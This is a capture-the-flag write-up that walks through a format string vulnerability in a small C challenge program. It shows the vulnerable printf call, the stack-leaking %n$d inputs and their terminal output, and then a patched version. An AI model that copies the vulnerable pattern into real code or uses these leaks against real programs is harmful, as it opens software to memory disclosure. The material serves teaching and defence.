Let's take a look at the source code...

```
#include <stdio.h>
#include <stdlib.h>

int main()
{
    srand(time(NULL));
    char input1[20];
    char input2[5];
    int f;
    int c = 0;
    f = rand() % 100 + 1;
    
    printf("We finally patched that pesky buffer overflow vulnerabillity.\n");
    fgets(input1, sizeof(input1), stdin);
    printf(input1);
    printf("So now you can do your favorite thing in the world!\n");
    fgets(input2, sizeof(input2), stdin);
    c = atoi(input2);
    if(c == f)
    {
       	printf("If you keep on going, we will have to cancel the celebration. Level Cleared\n");	
    }

   else
   {
	printf("You must really love to research.\n");
   }
}
```

So we can see here there are two vulnerabillities. The first one is that it uses tine as a seed for the random function, so we can generate the same seed and thus the same sequence of random numbers (however we will save exploiting that for a later challenge). The second exploit is a format string exploit where it inputs user defined data, then prints it out without formatting it. Because of this, we can insert our on flags such as "%x" to read stack values as hex, "%d" to read off stack values as a decimal, or "%n" to actually write to stack values. 

Looking at this program, we see that in order to pass the level we will have to set c equal to f. We control the value of c, so we just need to find out what the value of f is. We know that f will be a random (not really) integer between 1 and 100. We can just read off stack values untill we see an integer withing that range, that changes it's value every time the program is run but remains in that range using the string format exploit. Then we can just input it into c, then it should work. We will have to keep in mind that we can only input 20 characters at a time because of the secure fgets call, so we can only look at 3 stack values at a time. Let's try it.

```
guyinatuxedo@tux:/Hackery/escape/fmt_str/f0$ ./f0
We finally patched that pesky buffer overflow vulnerabillity.
%1$d.%2$d.%3$d
20.-134527584.134514049
So now you can do your favorite thing in the world!
This may be it, I doubt it
You must really love to research.
guyinatuxedo@tux:/Hackery/escape/fmt_str/f0$ ./f0
We finally patched that pesky buffer overflow vulnerabillity.
%1$d.%2$d.%3$d
20.-134527584.134514049
So now you can do your favorite thing in the world!
Nope, it didn't change
You must really love to research.
guyinatuxedo@tux:/Hackery/escape/fmt_str/f0$ ./f0
We finally patched that pesky buffer overflow vulnerabillity.
%4$d.%5$d.%6$d
32768.-134529024.-134536636
So now you can do your favorite thing in the world!
nope
You must really love to research.
guyinatuxedo@tux:/Hackery/escape/fmt_str/f0$ ./f0
We finally patched that pesky buffer overflow vulnerabillity.
%7$d.%8$d.%9$d
-136208148.1.1680095013
So now you can do your favorite thing in the world!
Possibly
You must really love to research.
guyinatuxedo@tux:/Hackery/escape/fmt_str/f0$ ./f0
We finally patched that pesky buffer overflow vulnerabillity.
%7$d.%8$d.%9$d
-136208148.1.1680095013
So now you can do your favorite thing in the world!
Nope
You must really love to research.
guyinatuxedo@tux:/Hackery/escape/fmt_str/f0$ ./f0
We finally patched that pesky buffer overflow vulnerabillity.
%10$d.%11$d.%12$d
824520292.778314801.607269157
So now you can do your favorite thing in the world!
Nope
You must really love to research.
guyinatuxedo@tux:/Hackery/escape/fmt_str/f0$ ./f0
We finally patched that pesky buffer overflow vulnerabillity.
%13$d.%14$d.%15$d
-16774556.67.0
So now you can do your favorite thing in the world!
Mayber
You must really love to research.
guyinatuxedo@tux:/Hackery/escape/fmt_str/f0$ ./f0
We finally patched that pesky buffer overflow vulnerabillity.
%13$d.%14$d.%15$d
-16774556.34.0
So now you can do your favorite thing in the world!
34
If you keep on going, we will have to cancel the celebration. Level Cleared
```

So we found our changin integer between 1 and 100, at 14 stack values from the printf call. And just like that, we pwned the binary. Now let's patch it.

```
#include <stdio.h>
#include <stdlib.h>

int main()
{
    srand(time(NULL));
    char input1[20];
    char input2[5];
    int f;
    int c = 0;
    f = rand() % 100 + 1;
    
    printf("We finally patched that pesky buffer overflow vulnerabillity.\n");
    fgets(input1, sizeof(input1), stdin);
    printf("%s\n", input1);
    printf("So now you can do your favorite thing in the world!\n");
    fgets(input2, sizeof(input2), stdin);
    c = atoi(input2);
    if(c == f)
    {
       	printf("If you keep on going, we will have to cancel the celebration. Level Cleared\n");	
    }

   else
   {
	printf("You must really love to research.\n");
   }
}
```

As you can see, this program still prints out user defined data however it formats it as a string so it is no longer vulnerable. Let's test it out.

```
guyinatuxedo@tux:/Hackery/escape/fmt_str/f0$ ./f0_secure 
We finally patched that pesky buffer overflow vulnerabillity.
%x
%x

So now you can do your favorite thing in the world!
jfeiwqojfeoi[q
You must really love to research.
```

As you can see, it printed out the user defined data formatted correctly so it is no longer vulnerable. And just like that we patched the binary.

